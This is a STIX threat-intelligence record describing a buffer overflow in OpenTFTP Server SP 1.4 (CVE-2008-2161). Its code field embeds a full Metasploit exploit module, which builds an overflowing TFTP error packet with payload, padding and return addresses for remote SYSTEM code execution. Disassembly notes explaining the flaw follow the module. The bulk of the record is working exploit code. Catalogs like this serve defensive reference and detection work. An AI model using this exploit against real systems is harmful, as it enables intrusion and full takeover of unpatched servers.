{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ee93ff4-03ec-427f-be02-c4d4ab2b8ca2",
    "created": "2024-08-14T16:50:27.394164Z",
    "modified": "2024-08-14T16:50:27.394168Z",
    "name": "OpenTFTP SP 1.4 Error Packet Overflow",
    "description": " This module exploits a buffer overflow in OpenTFTP Server SP 1.4.  The vulnerable condition triggers when the TFTP opcode is configured as an error packet, the TFTP service will then format the message using a sprintf() function, which causes an overflow, therefore allowing remote code execution under the context of SYSTEM.  The offset (to EIP) is specific to how the TFTP was started (as a 'Stand Alone' or 'Service').  By default the target is set to 'Service' because that's the default configuration during OpenTFTP Server SP 1.4's installation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/tftp/opentftp_error_code.rb",
            "external_id": "opentftp_error_code.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-2161"
        },
        {
            "source_name": "reference",
            "url": "http://downloads.securityfocus.com/vulnerabilities/exploits/29111.pl"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'OpenTFTP SP 1.4 Error Packet Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in OpenTFTP Server SP 1.4.  The vulnerable\n        condition triggers when the TFTP opcode is configured as an error packet, the TFTP\n        service will then format the message using a sprintf() function, which causes an\n        overflow, therefore allowing remote code execution under the context of SYSTEM.\n\n          The offset (to EIP) is specific to how the TFTP was started (as a 'Stand Alone',\n        or 'Service').  By default the target is set to 'Service' because that's the default\n        configuration during OpenTFTP Server SP 1.4's installation.\n      },\n      'Author'         =>\n        [\n          'tixxDZ',     #Initial discovery, poc\n          'steponequit' #Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2008-2161'],\n          ['OSVDB', '44904'],\n          ['BID', '29111'],\n          ['URL', 'http://downloads.securityfocus.com/vulnerabilities/exploits/29111.pl']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'           => 5000,\n          'BadChars'        => \"\\x00\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          #.bss section that is overwritten\n          [ 'OpenTFTP 1.4 Service',      { 'Ret' => 0x0041b3ab } ],\n          [ 'OpenTFTP 1.4 Stand Alone',  { 'Ret' => 0x0041b3ab } ]\n\n        ],\n      #TFTP server is installed as an NT service by default\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => '2008-07-05'))\n\n    register_options(\n      [\n        Opt::RPORT(69),\n      ])\n  end\n\n  def exploit\n\n    if target.name =~ /OpenTFTP 1.4 Stand Alone/\n      # This hits msvcrt.printf()\n      sploit = \"\\x00\\x05\" + make_nops(10)\n      sploit << payload.encoded\n      sploit << rand_text_alpha(20517 - payload.encoded.length)\n      sploit << [target['Ret']].pack('V')\n      sploit << Rex::Text.rand_text_alpha(1469)\n\n    elsif target.name =~ /OpenTFTP 1.4 Service/\n      #This hits time()\n      sploit = \"\\x00\\x05\" + make_nops(10)\n      sploit << payload.encoded\n      sploit << rand_text_alpha(20445 - payload.encoded.length)\n      sploit << [target['Ret']].pack('V')\n      sploit << Rex::Text.rand_text_alpha(1545)\n    end\n\n    # Send the malicious packet\n    connect_udp\n    udp_sock.put(sploit)\n    handler\n    disconnect_udp\n\n  end\nend\n\n=begin\nNOTE: If the module is run on a OSX box, you will probably see this error:\n[-] Exploit exception: Message too long\nThat's OSX for you.\n\nThe vulnerable condition triggers when the TFTP opcode \"\\x00\\x05\" gets parsed in a ntohs() call:\n.text:004022F6  mov     eax, ds:dword_41B370\n.text:004022FB  movzx   eax, word ptr [eax]\n.text:004022FE  mov     [esp+5C8h+var_5C8], eax\n.text:00402301  mov     [ebp+var_550], 0FFFFFFFFh\n.text:0040230B  call    ntohs\n.text:00402310  sub     esp, 4\n.text:00402313  cmp     ax, 5\n.text:00402317  jnz     short loc_40236F\n...\n\nWhen the value matches 0x05, we then head down to a sprinf() function to generate an error\nmessage, which causes an overflow:\n.text:00402330  mov   eax, ds:dword_41B370\n.text:00402335  add   eax, 4\n.text:00402338  mov   [esp+5C8h+var_5BC], eax\n.text:0040233C  mov   [esp+5C8h+var_5C0], edx\n.text:00402340  mov   [esp+5C8h+var_5C4], offset aErrorIAtClient ; \"Error %i at Client, %s\"\n.text:00402348  mov   [esp+5C8h+var_5C8], offset byte_41B394\n.text:0040234F  call  sprintf\n\nAnd then we either corrupt a msvcrt.printf() or time() call (in logMess), which end up gaining\ncontrol.\n\nIn source:\nhttp://pastebin.com/QgZDwcan\n\nelse if (ntohs(datain->opcode) == 5)  // Line 224\n{\n  sprintf(serverError.errormessage, \"Error %i at Client, %s\", ntohs(datain->block), &datain->buffer);\n  logMess(req1, 1);\n  ..... so on .....\n\nYou can also corrupt a SetServiceStatus() call with a smaller buffer, but obviously doesn't\ngive you a better crash than this one.\n=end\n",
    "x_mitre_disclosure_date": "2008-07-05",
    "x_mitre_platforms": [
        "win'"
    ]
}